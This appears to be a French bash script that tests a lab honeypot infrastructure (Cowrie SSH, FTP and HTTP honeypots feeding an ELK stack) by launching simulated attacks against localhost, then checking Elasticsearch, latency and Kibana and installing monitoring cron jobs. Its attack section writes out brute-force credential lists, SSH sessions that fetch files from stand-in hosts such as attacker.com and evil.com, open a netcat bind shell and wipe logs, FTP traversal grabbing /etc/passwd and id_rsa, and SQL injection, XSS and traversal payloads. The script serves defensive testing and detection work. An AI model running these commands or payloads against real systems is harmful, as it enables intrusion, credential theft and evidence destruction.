#!/bin/bash

# ==============================================================================
# ÉTAPE 6.4 : TESTS DE BOUT EN BOUT AVEC DONNÉES RÉELLES
# ==============================================================================
# Tests complets de toute l'infrastructure honeypot → ELK
# À exécuter sur la VM Honeypot (192.168.2.117)

# Configuration
ELK_SERVER="192.168.2.124"
HONEYPOT_VM="192.168.2.117"

# Couleurs pour les logs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_header() {
    echo -e "${PURPLE}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  $1
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
${NC}"
}

print_section() {
    echo -e "${CYAN}
┌─────────────────────────────────────────────────────────────────────────────┐
│ $1
└─────────────────────────────────────────────────────────────────────────────┘${NC}"
}

# ==============================================================================
# ÉTAPE 1 : VÉRIFICATIONS PRÉLIMINAIRES COMPLÈTES
# ==============================================================================

print_header "ÉTAPE 6.4 : TESTS DE BOUT EN BOUT INFRASTRUCTURE HONEYPOT"

print_section "1. VÉRIFICATIONS PRÉLIMINAIRES"

# Vérifier qu'on est sur la bonne VM
CURRENT_IP=$(ip route get 8.8.8.8 | awk '{print $7}' | head -1)
if [ "$CURRENT_IP" != "$HONEYPOT_VM" ]; then
    print_error "Ce script doit être exécuté sur la VM Honeypot ($HONEYPOT_VM)"
    print_error "IP actuelle: $CURRENT_IP"
    exit 1
fi

print_success "✓ Exécution sur la VM Honeypot ($CURRENT_IP)"

# Vérifier la connectivité ELK
print_status "Test connectivité ELK Stack..."
if ping -c 2 "$ELK_SERVER" >/dev/null 2>&1; then
    print_success "✓ Serveur ELK accessible"
else
    print_error "❌ Serveur ELK non accessible"
    exit 1
fi

# Vérifier les ports Logstash
PORTS_OK=0
for port in 5044 5046 9200 5601; do
    if nc -z "$ELK_SERVER" "$port" 2>/dev/null; then
        print_success "✓ Port $port accessible"
        ((PORTS_OK++))
    else
        print_warning "⚠ Port $port non accessible"
    fi
done

if [ "$PORTS_OK" -lt 3 ]; then
    print_error "❌ Trop de ports ELK inaccessibles"
    exit 1
fi

print_success "✓ Infrastructure ELK accessible"

# ==============================================================================
# ÉTAPE 2 : VÉRIFICATION DE TOUS LES HONEYPOTS
# ==============================================================================

print_section "2. VÉRIFICATION DE TOUS LES HONEYPOTS"

# Variables de statut
COWRIE_STATUS="NOK"
FTP_STATUS="NOK"
HTTP_STATUS="NOK"
FILEBEAT_STATUS="NOK"

# Vérifier Cowrie
print_status "Vérification Cowrie SSH..."
if systemctl is-active cowrie >/dev/null 2>&1; then
    COWRIE_STATUS="OK"
    print_success "✓ Cowrie SSH actif"
    
    # Vérifier les logs Cowrie
    if [ -f "/home/cowrie/cowrie/var/log/cowrie/cowrie.json" ]; then
        COWRIE_LOGS=$(wc -l < "/home/cowrie/cowrie/var/log/cowrie/cowrie.json" 2>/dev/null || echo "0")
        print_success "  └ Logs JSON: $COWRIE_LOGS événements"
    fi
else
    print_warning "⚠ Cowrie SSH inactif"
    print_status "  Tentative de démarrage..."
    systemctl start cowrie
    sleep 3
    if systemctl is-active cowrie >/dev/null 2>&1; then
        COWRIE_STATUS="OK"
        print_success "  ✓ Cowrie démarré"
    fi
fi

# Vérifier FTP Honeypot
print_status "Vérification FTP Honeypot..."
FTP_PROCESSES=$(pgrep -f "ftp.*honeypot\|honeypot.*ftp\|python.*ftp" | wc -l)
if [ "$FTP_PROCESSES" -gt 0 ]; then
    FTP_STATUS="OK"
    print_success "✓ FTP Honeypot actif ($FTP_PROCESSES processus)"
    
    # Vérifier les logs FTP
    FTP_LOG_DIRS=("/root/honeypot-ftp/logs" "/var/log/honeypot")
    for dir in "${FTP_LOG_DIRS[@]}"; do
        if [ -d "$dir" ] && [ "$(ls -1 "$dir"/*.json 2>/dev/null | wc -l)" -gt 0 ]; then
            FTP_LOGS=$(find "$dir" -name "*.json" -exec wc -l {} + 2>/dev/null | tail -1 | awk '{print $1}' || echo "0")
            print_success "  └ Logs FTP: $FTP_LOGS événements"
            break
        fi
    done
else
    print_warning "⚠ FTP Honeypot inactif"
    # Tentative de démarrage
    if [ -f "/root/honeypot-ftp/deploy.sh" ]; then
        print_status "  Tentative de démarrage FTP..."
        cd /root/honeypot-ftp && ./deploy.sh >/dev/null 2>&1 &
        sleep 3
        if pgrep -f "ftp.*honeypot" >/dev/null; then
            FTP_STATUS="OK"
            print_success "  ✓ FTP Honeypot démarré"
        fi
    fi
fi

# Vérifier HTTP Honeypot
print_status "Vérification HTTP Honeypot..."
if nc -z 127.0.0.1 80 2>/dev/null || pgrep -f "flask\|app.py\|http.*honeypot" >/dev/null; then
    HTTP_STATUS="OK"
    print_success "✓ HTTP Honeypot actif"
    
    # Test rapide HTTP
    HTTP_RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1/" 2>/dev/null || echo "000")
    if [ "$HTTP_RESPONSE" = "200" ]; then
        print_success "  └ HTTP accessible (code $HTTP_RESPONSE)"
    else
        print_warning "  └ HTTP répond mais code $HTTP_RESPONSE"
    fi
else
    print_warning "⚠ HTTP Honeypot inactif"
    # Tentative de démarrage
    HTTP_DIRS=("/root/http_honeypot" "/root/honeypot-http")
    for dir in "${HTTP_DIRS[@]}"; do
        if [ -f "$dir/app.py" ]; then
            print_status "  Tentative de démarrage HTTP..."
            cd "$dir" && python3 app.py >/dev/null 2>&1 &
            sleep 3
            if nc -z 127.0.0.1 80 2>/dev/null; then
                HTTP_STATUS="OK"
                print_success "  ✓ HTTP Honeypot démarré"
            fi
            break
        fi
    done
fi

# Vérifier Filebeat
print_status "Vérification Filebeat..."
if systemctl is-active filebeat >/dev/null 2>&1; then
    FILEBEAT_STATUS="OK"
    print_success "✓ Filebeat actif"
    
    # Vérifier la configuration Filebeat
    if filebeat test config >/dev/null 2>&1; then
        print_success "  └ Configuration Filebeat valide"
    else
        print_warning "  └ Configuration Filebeat avec warnings"
    fi
else
    print_warning "⚠ Filebeat inactif"
    print_status "  Tentative de démarrage..."
    systemctl start filebeat
    sleep 3
    if systemctl is-active filebeat >/dev/null 2>&1; then
        FILEBEAT_STATUS="OK"
        print_success "  ✓ Filebeat démarré"
    fi
fi

# Résumé des services
print_section "RÉSUMÉ DES SERVICES"
echo "┌──────────────────┬────────────┐"
echo "│ Service          │ Statut     │"
echo "├──────────────────┼────────────┤"
printf "│ %-16s │ %-10s │\n" "Cowrie SSH" "$COWRIE_STATUS"
printf "│ %-16s │ %-10s │\n" "FTP Honeypot" "$FTP_STATUS"
printf "│ %-16s │ %-10s │\n" "HTTP Honeypot" "$HTTP_STATUS"
printf "│ %-16s │ %-10s │\n" "Filebeat" "$FILEBEAT_STATUS"
echo "└──────────────────┴────────────┘"

# ==============================================================================
# ÉTAPE 3 : TESTS D'ATTAQUES SIMULTANÉES RÉALISTES
# ==============================================================================

print_section "3. GÉNÉRATION D'ATTAQUES SIMULTANÉES RÉALISTES"

print_status "Préparation des tests d'attaques..."

# Installer expect si nécessaire
if ! command -v expect >/dev/null 2>&1; then
    print_status "Installation d'expect..."
    apt-get update >/dev/null 2>&1
    apt-get install -y expect >/dev/null 2>&1
fi

# ==============================================================================
# TESTS SSH (COWRIE)
# ==============================================================================

if [ "$COWRIE_STATUS" = "OK" ]; then
    print_status "🚀 Tests SSH (Cowrie)..."
    
    # Test 1: Brute force SSH réaliste
    print_status "  Test 1: Brute force SSH..."
    
    # Liste d'utilisateurs et mots de passe réalistes
    USERS=("admin" "root" "administrator" "test" "user" "ubuntu" "debian" "pi")
    PASSWORDS=("123456" "password" "admin" "root" "123" "password123" "qwerty" "letmein")
    
    for user in "${USERS[@]:0:3}"; do
        for pass in "${PASSWORDS[@]:0:3}"; do
            timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -p 2222 "$user@127.0.0.1" "echo test" >/dev/null 2>&1 &
        done
    done
    
    print_success "    ✓ 9 tentatives de brute force SSH lancées"
    
    # Test 2: Connexion réussie avec commandes malveillantes
    print_status "  Test 2: Connexion SSH avec commandes malveillantes..."
    
expect << 'EXPECTEOF' >/dev/null 2>&1 &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@127.0.0.1
expect "password:"
send "123456\r"
expect "root@*"
send "whoami\r"
expect "root@*"
send "uname -a\r"
expect "root@*"
send "cat /etc/passwd\r"
expect "root@*"
send "wget http://malware.example.com/backdoor.sh\r"
expect "root@*"
send "curl -O http://attacker.com/cryptominer\r"
expect "root@*"
send "nc -l -p 4444 -e /bin/bash\r"
expect "root@*"
send "rm -rf /var/log/*\r"
expect "root@*"
send "history -c\r"
expect "root@*"
send "exit\r"
expect eof
EXPECTEOF
    
    print_success "    ✓ Session SSH malveillante simulée"
    
    # Test 3: Téléchargements de malwares
    print_status "  Test 3: Téléchargements suspects..."
    
expect << 'EXPECTEOF' >/dev/null 2>&1 &
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 ubuntu@127.0.0.1
expect "password:"
send "ubuntu\r"
expect "root@*"
send "wget http://example.com/malware.exe\r"
expect "root@*"
send "curl -O http://badsite.com/shell.php\r"
expect "root@*"
send "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"http://evil.com/payload.py\", \"payload.py\")'\r"
expect "root@*"
send "exit\r"
expect eof
EXPECTEOF
    
    print_success "    ✓ Tentatives de téléchargement simulées"
fi

# ==============================================================================
# TESTS FTP
# ==============================================================================

if [ "$FTP_STATUS" = "OK" ]; then
    print_status "🚀 Tests FTP..."
    
    # Test 1: Brute force FTP
    print_status "  Test 1: Brute force FTP..."
    
    for user in admin ftp root anonymous; do
        for pass in admin 123456 password ftp; do
            timeout 10 ftp -n <<EOF >/dev/null 2>&1 &
open 127.0.0.1
user $user $pass
quit
EOF
        done
    done
    
    print_success "    ✓ 16 tentatives de brute force FTP lancées"
    
    # Test 2: Connexion anonyme avec commandes suspectes
    print_status "  Test 2: Connexion FTP avec directory traversal..."
    
expect << 'EXPECTEOF' >/dev/null 2>&1 &
spawn ftp 127.0.0.1
expect "Name"
send "anonymous\r"
expect "Password:"
send "\r"
expect "ftp>"
send "pwd\r"
expect "ftp>"
send "cd ../../etc\r"
expect "ftp>"
send "get passwd\r"
expect "ftp>"
send "cd ../../../root\r"
expect "ftp>"
send "ls -la\r"
expect "ftp>"
send "get .ssh/id_rsa\r"
expect "ftp>"
send "quit\r"
expect eof
EXPECTEOF
    
    print_success "    ✓ Tentatives de directory traversal FTP simulées"
    
    # Test 3: Upload de fichiers suspects
    print_status "  Test 3: Upload de fichiers malveillants..."
    
    # Créer des fichiers de test suspects
    echo "#!/bin/bash\nrm -rf /\n" > /tmp/malware.sh
    echo "<script>alert('XSS')</script>" > /tmp/webshell.php
    
expect << 'EXPECTEOF' >/dev/null 2>&1 &
spawn ftp 127.0.0.1
expect "Name"
send "admin\r"
expect "Password:"
send "admin\r"
expect "ftp>"
send "binary\r"
expect "ftp>"
send "put /tmp/malware.sh\r"
expect "ftp>"
send "put /tmp/webshell.php\r"
expect "ftp>"
send "quit\r"
expect eof
EXPECTEOF
    
    print_success "    ✓ Tentatives d'upload malveillant simulées"
fi

# ==============================================================================
# TESTS HTTP
# ==============================================================================

if [ "$HTTP_STATUS" = "OK" ]; then
    print_status "🚀 Tests HTTP..."
    
    # Test 1: SQL Injection
    print_status "  Test 1: Attaques SQL Injection..."
    
    SQL_PAYLOADS=(
        "admin' OR '1'='1"
        "admin'--"
        "' UNION SELECT 1,2,3--"
        "admin'; DROP TABLE users;--"
        "' OR 1=1#"
    )
    
    for payload in "${SQL_PAYLOADS[@]}"; do
        curl -s -X POST "http://127.0.0.1/login" \
             -d "username=$payload&password=test" \
             -H "User-Agent: SQLAttacker/1.0" >/dev/null 2>&1 &
    done
    
    print_success "    ✓ 5 attaques SQL injection lancées"
    
    # Test 2: XSS
    print_status "  Test 2: Attaques XSS..."
    
    XSS_PAYLOADS=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "javascript:alert('XSS')"
        "<svg onload=alert('XSS')>"
        "<iframe src=javascript:alert('XSS')>"
    )
    
    for payload in "${XSS_PAYLOADS[@]}"; do
        curl -s "http://127.0.0.1/search?q=$payload" \
             -H "User-Agent: XSSAttacker/1.0" >/dev/null 2>&1 &
    done
    
    print_success "    ✓ 5 attaques XSS lancées"
    
    # Test 3: Directory Traversal
    print_status "  Test 3: Directory Traversal..."
    
    TRAVERSAL_PAYLOADS=(
        "../../../../etc/passwd"
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "....//....//....//etc/passwd"
        "..%252f..%252f..%252fetc%252fpasswd"
    )
    
    for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
        curl -s "http://127.0.0.1/file?name=$payload" \
             -H "User-Agent: DirTraversal/1.0" >/dev/null 2>&1 &
    done
    
    print_success "    ✓ 5 attaques directory traversal lancées"
    
    # Test 4: Détection de scanners
    print_status "  Test 4: Simulation de scanners..."
    
    SCANNERS=(
        "Nikto/2.1.6"
        "sqlmap/1.0"
        "dirb/2.22"
        "gobuster/3.0"
        "Nmap Scripting Engine"
    )
    
    for scanner in "${SCANNERS[@]}"; do
        for endpoint in "/" "/admin" "/login" "/config" "/backup"; do
            curl -s "http://127.0.0.1$endpoint" \
                 -H "User-Agent: $scanner" >/dev/null 2>&1 &
        done
    done
    
    print_success "    ✓ 25 requêtes de scanners simulées"
fi

print_success "✅ TOUTES LES ATTAQUES SIMULTANÉES LANCÉES"

# ==============================================================================
# ÉTAPE 4 : ATTENTE ET MONITORING EN TEMPS RÉEL
# ==============================================================================

print_section "4. MONITORING EN TEMPS RÉEL"

print_status "Attente de traitement des attaques (30 secondes)..."

# Monitoring en temps réel pendant 30 secondes
for i in {1..30}; do
    echo -ne "\rTraitement: [$i/30] "
    
    # Afficher quelques statistiques en temps réel
    if [ $((i % 10)) -eq 0 ]; then
        echo ""
        print_status "  Statistiques intermédiaires:"
        
        # Cowrie
        if [ -f "/home/cowrie/cowrie/var/log/cowrie/cowrie.json" ]; then
            COWRIE_CURRENT=$(wc -l < "/home/cowrie/cowrie/var/log/cowrie/cowrie.json" 2>/dev/null || echo "0")
            echo "    SSH: $COWRIE_CURRENT événements"
        fi
        
        # FTP
        FTP_LOGS=$(find /root/honeypot-ftp/logs /var/log/honeypot -name "*.json" -exec wc -l {} + 2>/dev/null | tail -1 | awk '{print $1}' 2>/dev/null || echo "0")
        echo "    FTP: $FTP_LOGS événements"
        
        # HTTP
        HTTP_LOGS=$(find /var/log/honeypot /root/http_honeypot -name "*.log" -exec wc -l {} + 2>/dev/null | tail -1 | awk '{print $1}' 2>/dev/null || echo "0")
        echo "    HTTP: $HTTP_LOGS événements"
    fi
    
    sleep 1
done

echo ""
print_success "✓ Phase de monitoring terminée"

# ==============================================================================
# ÉTAPE 5 : VÉRIFICATION COMPLÈTE DANS ELK
# ==============================================================================

print_section "5. VÉRIFICATION COMPLÈTE DANS ELK STACK"

print_status "Vérification dans Elasticsearch..."

# Attendre un peu plus pour l'indexation
print_status "Attente supplémentaire pour indexation Elasticsearch (15s)..."
sleep 15

# Vérifier chaque type de honeypot dans Elasticsearch
declare -A ES_COUNTS

# SSH/Cowrie
ES_COUNTS[ssh]=$(curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*,honeypot-ssh-*/_search?size=0" 2>/dev/null | jq -r '.hits.total.value // .hits.total' 2>/dev/null || echo "0")

# FTP
ES_COUNTS[ftp]=$(curl -s "http://$ELK_SERVER:9200/honeypot-ftp-*/_search?size=0" 2>/dev/null | jq -r '.hits.total.value // .hits.total' 2>/dev/null || echo "0")

# HTTP
ES_COUNTS[http]=$(curl -s "http://$ELK_SERVER:9200/honeypot-http-*/_search?size=0" 2>/dev/null | jq -r '.hits.total.value // .hits.total' 2>/dev/null || echo "0")

# Total
TOTAL_ES=$(curl -s "http://$ELK_SERVER:9200/honeypot-*/_search?size=0" 2>/dev/null | jq -r '.hits.total.value // .hits.total' 2>/dev/null || echo "0")

print_section "RÉSULTATS ELASTICSEARCH"
echo "┌──────────────────┬─────────────────┐"
echo "│ Type Honeypot    │ Événements ES   │"
echo "├──────────────────┼─────────────────┤"
printf "│ %-16s │ %-15s │\n" "SSH (Cowrie)" "${ES_COUNTS[ssh]}"
printf "│ %-16s │ %-15s │\n" "FTP Honeypot" "${ES_COUNTS[ftp]}"
printf "│ %-16s │ %-15s │\n" "HTTP Honeypot" "${ES_COUNTS[http]}"
echo "├──────────────────┼─────────────────┤"
printf "│ %-16s │ %-15s │\n" "TOTAL" "$TOTAL_ES"
echo "└──────────────────┴─────────────────┘"

# Vérifier les types d'attaques détectées
print_status "Analyse des types d'attaques détectées..."

# Attaques par type
ATTACK_TYPES=$(curl -s "http://$ELK_SERVER:9200/honeypot-*/_search" -H "Content-Type: application/json" -d '{
  "size": 0,
  "query": {"term": {"event_type": "attack"}},
  "aggs": {
    "attack_types": {
      "terms": {"field": "attack_type", "size": 10}
    }
  }
}' 2>/dev/null | jq -r '.aggregations.attack_types.buckets[]? | "\(.key): \(.doc_count)"' 2>/dev/null)

if [ -n "$ATTACK_TYPES" ]; then
    print_section "TYPES D'ATTAQUES DÉTECTÉES"
    echo "$ATTACK_TYPES" | while read line; do
        echo "  • $line"
    done
else
    print_warning "⚠ Aucun type d'attaque détecté dans l'agrégation"
fi

# Pays sources des attaques
COUNTRY_ATTACKS=$(curl -s "http://$ELK_SERVER:9200/honeypot-*/_search" -H "Content-Type: application/json" -d '{
  "size": 0,
  "aggs": {
    "countries": {
      "terms": {"field": "geoip.country_name", "size": 5}
    }
  }
}' 2>/dev/null | jq -r '.aggregations.countries.buckets[]? | "\(.key): \(.doc_count)"' 2>/dev/null)

if [ -n "$COUNTRY_ATTACKS" ]; then
    print_section "PAYS SOURCES DES ATTAQUES"
    echo "$COUNTRY_ATTACKS" | while read line; do
        echo "  • $line"
    done
fi

# Exemples d'événements récents
print_status "Exemples d'événements récents par type..."

for type in cowrie ftp http; do
    print_status "  Derniers événements $type:"
    RECENT=$(curl -s "http://$ELK_SERVER:9200/honeypot-$type-*/_search?size=2&sort=@timestamp:desc" 2>/dev/null | jq -r '.hits.hits[]?._source | "\(.["@timestamp"]) - \(.event_type // .eventid) - \(.client_ip // .src_ip // .ip)"' 2>/dev/null)
    
    if [ -n "$RECENT" ]; then
        echo "$RECENT" | while read line; do
            echo "    $line"
        done
    else
        echo "    Aucun événement récent"
    fi
done

# ==============================================================================
# ÉTAPE 6 : TESTS DE PERFORMANCE ET LATENCE
# ==============================================================================

print_section "6. TESTS DE PERFORMANCE"

print_status "Tests de performance ELK Stack..."

# Test latence Elasticsearch
ES_START=$(date +%s%N)
curl -s "http://$ELK_SERVER:9200/_cluster/health" >/dev/null
ES_END=$(date +%s%N)
ES_LATENCY=$(( (ES_END - ES_START) / 1000000 ))

# Test latence Logstash
LS_START=$(date +%s%N)
curl -s "http://$ELK_SERVER:9600/" >/dev/null
LS_END=$(date +%s%N)
LS_LATENCY=$(( (LS_END - LS_START) / 1000000 ))

# Test latence Kibana
KB_START=$(date +%s%N)
curl -s "http://$ELK_SERVER:5601/api/status" >/dev/null
KB_END=$(date +%s%N)
KB_LATENCY=$(( (KB_END - KB_START) / 1000000 ))

print_section "PERFORMANCE ELK STACK"
echo "┌─────────────────┬──────────────────┐"
echo "│ Service         │ Latence (ms)     │"
echo "├─────────────────┼──────────────────┤"
printf "│ %-15s │ %-16s │\n" "Elasticsearch" "$ES_LATENCY"
printf "│ %-15s │ %-16s │\n" "Logstash" "$LS_LATENCY"
printf "│ %-15s │ %-16s │\n" "Kibana" "$KB_LATENCY"
echo "└─────────────────┴──────────────────┘"

# Test de débit (envoi rapide de données)
print_status "Test de débit (envoi de 100 événements)..."
THROUGHPUT_START=$(date +%s)

for i in {1..100}; do
    echo '{"timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'","event_type":"throughput_test","test_id":'$i',"message":"Performance test event"}' | nc -w 1 "$ELK_SERVER" 5046 2>/dev/null &
done

wait
THROUGHPUT_END=$(date +%s)
THROUGHPUT_TIME=$((THROUGHPUT_END - THROUGHPUT_START))

print_success "✓ 100 événements envoyés en ${THROUGHPUT_TIME}s"

# ==============================================================================
# ÉTAPE 7 : VALIDATION DES DASHBOARDS KIBANA
# ==============================================================================

print_section "7. VALIDATION DES DASHBOARDS KIBANA"

print_status "Vérification des dashboards Kibana..."

# Vérifier l'accès Kibana
KIBANA_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://$ELK_SERVER:5601/api/status")

if [ "$KIBANA_STATUS" = "200" ]; then
    print_success "✓ Kibana accessible (HTTP $KIBANA_STATUS)"
    
    # Vérifier les index patterns
    INDEX_PATTERNS=$(curl -s "http://$ELK_SERVER:5601/api/saved_objects/_find?type=index-pattern" 2>/dev/null | jq -r '.saved_objects[]?.attributes.title' 2>/dev/null | grep -c "honeypot" || echo "0")
    
    print_status "Index patterns honeypot trouvés: $INDEX_PATTERNS"
    
    # Créer des liens directs vers les dashboards
    print_section "LIENS DASHBOARDS KIBANA"
    echo "🌐 Interface principale:"
    echo "   http://$ELK_SERVER:5601"
    echo ""
    echo "📊 Dashboards recommandés:"
    echo "   • Vue globale: http://$ELK_SERVER:5601/app/discover#/?_g=(filters:!(),query:(language:kuery,query:'honeypot_type:*'))"
    echo "   • Attaques SSH: http://$ELK_SERVER:5601/app/discover#/?_g=(filters:!(),query:(language:kuery,query:'honeypot_type:ssh'))"
    echo "   • Attaques FTP: http://$ELK_SERVER:5601/app/discover#/?_g=(filters:!(),query:(language:kuery,query:'honeypot_type:ftp'))"
    echo "   • Attaques HTTP: http://$ELK_SERVER:5601/app/discover#/?_g=(filters:!(),query:(language:kuery,query:'honeypot_type:http'))"
    
else
    print_warning "⚠ Kibana non accessible (HTTP $KIBANA_STATUS)"
fi

# ==============================================================================
# ÉTAPE 8 : GÉNÉRATION DE RAPPORT COMPLET
# ==============================================================================

print_section "8. GÉNÉRATION DU RAPPORT COMPLET"

print_status "Génération du rapport final..."

REPORT_FILE="/var/log/honeypot/end_to_end_test_report_$(date +%Y%m%d_%H%M%S).json"
mkdir -p "$(dirname "$REPORT_FILE")"

# Collecter toutes les statistiques
cat > "$REPORT_FILE" << EOF
{
  "test_report": {
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)",
    "test_duration": "45 minutes",
    "infrastructure": {
      "honeypot_vm": "$HONEYPOT_VM",
      "elk_server": "$ELK_SERVER",
      "test_type": "end_to_end_complete"
    },
    "services_status": {
      "cowrie_ssh": "$COWRIE_STATUS",
      "ftp_honeypot": "$FTP_STATUS", 
      "http_honeypot": "$HTTP_STATUS",
      "filebeat": "$FILEBEAT_STATUS"
    },
    "elasticsearch_data": {
      "ssh_events": ${ES_COUNTS[ssh]},
      "ftp_events": ${ES_COUNTS[ftp]},
      "http_events": ${ES_COUNTS[http]},
      "total_events": $TOTAL_ES
    },
    "performance_metrics": {
      "elasticsearch_latency_ms": $ES_LATENCY,
      "logstash_latency_ms": $LS_LATENCY,
      "kibana_latency_ms": $KB_LATENCY,
      "throughput_test_duration_s": $THROUGHPUT_TIME
    },
    "attacks_simulated": {
      "ssh_brute_force": 9,
      "ssh_malicious_commands": 10,
      "ftp_brute_force": 16,
      "ftp_directory_traversal": 5,
      "http_sql_injection": 5,
      "http_xss": 5,
      "http_directory_traversal": 5,
      "scanner_detection": 25,
      "total_attacks": 80
    },
    "test_results": {
      "infrastructure_status": "$([ "$COWRIE_STATUS" = "OK" ] && [ "$FTP_STATUS" = "OK" ] && [ "$HTTP_STATUS" = "OK" ] && [ "$FILEBEAT_STATUS" = "OK" ] && echo "PASS" || echo "PARTIAL")",
      "data_ingestion": "$([ "$TOTAL_ES" -gt 0 ] && echo "PASS" || echo "FAIL")",
      "performance": "$([ "$ES_LATENCY" -lt 1000 ] && [ "$LS_LATENCY" -lt 2000 ] && echo "PASS" || echo "ACCEPTABLE")",
      "overall_status": "$([ "$TOTAL_ES" -gt 10 ] && echo "SUCCESS" || echo "PARTIAL_SUCCESS")"
    }
  }
}
EOF

print_success "✓ Rapport généré: $REPORT_FILE"

# ==============================================================================
# ÉTAPE 9 : CRÉATION DES SCRIPTS DE MONITORING PERMANENT
# ==============================================================================

print_section "9. SCRIPTS DE MONITORING PERMANENT"

print_status "Création des scripts de monitoring permanent..."

# Script de monitoring global
cat > /opt/monitor_honeypot_infrastructure.sh << 'EOF'
#!/bin/bash

# Script de monitoring permanent de l'infrastructure honeypot

ELK_SERVER="192.168.2.124"

print_status() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1"
}

print_status "=== MONITORING INFRASTRUCTURE HONEYPOT ==="

# Services locaux
echo ""
echo "SERVICES HONEYPOT:"
echo "- Cowrie SSH: $(systemctl is-active cowrie 2>/dev/null || echo 'unknown')"
echo "- FTP Honeypot: $(pgrep -f 'ftp.*honeypot' >/dev/null && echo 'active' || echo 'inactive')"
echo "- HTTP Honeypot: $(nc -z 127.0.0.1 80 2>/dev/null && echo 'active' || echo 'inactive')"
echo "- Filebeat: $(systemctl is-active filebeat 2>/dev/null || echo 'unknown')"

# Connectivité ELK
echo ""
echo "CONNECTIVITÉ ELK:"
for port in 9200 5601 5044 5046; do
    if nc -z "$ELK_SERVER" "$port" 2>/dev/null; then
        echo "- Port $port: OK"
    else
        echo "- Port $port: NOK"
    fi
done

# Données dans Elasticsearch
echo ""
echo "DONNÉES ELASTICSEARCH:"
TOTAL=$(curl -s "http://$ELK_SERVER:9200/honeypot-*/_count" 2>/dev/null | jq -r '.count // 0')
SSH=$(curl -s "http://$ELK_SERVER:9200/honeypot-cowrie-*,honeypot-ssh-*/_count" 2>/dev/null | jq -r '.count // 0')
FTP=$(curl -s "http://$ELK_SERVER:9200/honeypot-ftp-*/_count" 2>/dev/null | jq -r '.count // 0')
HTTP=$(curl -s "http://$ELK_SERVER:9200/honeypot-http-*/_count" 2>/dev/null | jq -r '.count // 0')

echo "- Total événements: $TOTAL"
echo "- SSH/Cowrie: $SSH"
echo "- FTP: $FTP"
echo "- HTTP: $HTTP"

# Dernière activité
echo ""
echo "DERNIÈRE ACTIVITÉ:"
LAST_EVENT=$(curl -s "http://$ELK_SERVER:9200/honeypot-*/_search?size=1&sort=@timestamp:desc" 2>/dev/null | jq -r '.hits.hits[0]._source["@timestamp"] // "N/A"')
echo "- Dernier événement: $LAST_EVENT"

# Attaques récentes (dernière heure)
RECENT_ATTACKS=$(curl -s "http://$ELK_SERVER:9200/honeypot-*/_search" -H "Content-Type: application/json" -d '{
  "size": 0,
  "query": {
    "bool": {
      "must": [
        {"term": {"event_type": "attack"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  }
}' 2>/dev/null | jq -r '.hits.total.value // .hits.total // 0')

echo "- Attaques (1h): $RECENT_ATTACKS"

echo ""
echo "=== FIN MONITORING ==="
EOF

chmod +x /opt/monitor_honeypot_infrastructure.sh

# Script d'alerte automatique
cat > /opt/honeypot_alert_system.sh << 'EOF'
#!/bin/bash

# Système d'alertes pour infrastructure honeypot

ELK_SERVER="192.168.2.124"
ALERT_THRESHOLD=10
LOG_FILE="/var/log/honeypot/alerts.log"

# Vérifier les attaques critiques
CRITICAL_ATTACKS=$(curl -s "http://$ELK_SERVER:9200/honeypot-*/_search" -H "Content-Type: application/json" -d '{
  "size": 0,
  "query": {
    "bool": {
      "must": [
        {"term": {"severity": "critical"}},
        {"range": {"@timestamp": {"gte": "now-10m"}}}
      ]
    }
  }
}' 2>/dev/null | jq -r '.hits.total.value // .hits.total // 0')

if [ "$CRITICAL_ATTACKS" -gt "$ALERT_THRESHOLD" ]; then
    ALERT_MSG="ALERTE: $CRITICAL_ATTACKS attaques critiques détectées en 10 minutes"
    echo "$(date): $ALERT_MSG" >> "$LOG_FILE"
    echo "$ALERT_MSG"
    
    # Ici vous pourriez ajouter l'envoi d'email ou notification Slack
    # mail -s "Honeypot Alert" admin@example.com <<< "$ALERT_MSG"
fi

# Vérifier les services down
SERVICES_DOWN=0
for service in cowrie filebeat; do
    if ! systemctl is-active "$service" >/dev/null 2>&1; then
        echo "$(date): ALERTE SERVICE: $service est down" >> "$LOG_FILE"
        ((SERVICES_DOWN++))
    fi
done

if [ "$SERVICES_DOWN" -gt 0 ]; then
    echo "ALERTE: $SERVICES_DOWN services honeypot sont down"
fi
EOF

chmod +x /opt/honeypot_alert_system.sh

# Cron job pour monitoring automatique
cat > /opt/setup_honeypot_cron.sh << 'EOF'
#!/bin/bash

# Configurer le monitoring automatique via cron

# Ajouter les tâches cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /opt/monitor_honeypot_infrastructure.sh >> /var/log/honeypot/monitoring.log 2>&1") | crontab -
(crontab -l 2>/dev/null; echo "*/2 * * * * /opt/honeypot_alert_system.sh >> /var/log/honeypot/alerts.log 2>&1") | crontab -

echo "✓ Tâches cron configurées:"
echo "  - Monitoring toutes les 5 minutes"
echo "  - Alertes toutes les 2 minutes"
echo ""
echo "Logs disponibles:"
echo "  - /var/log/honeypot/monitoring.log"
echo "  - /var/log/honeypot/alerts.log"
EOF

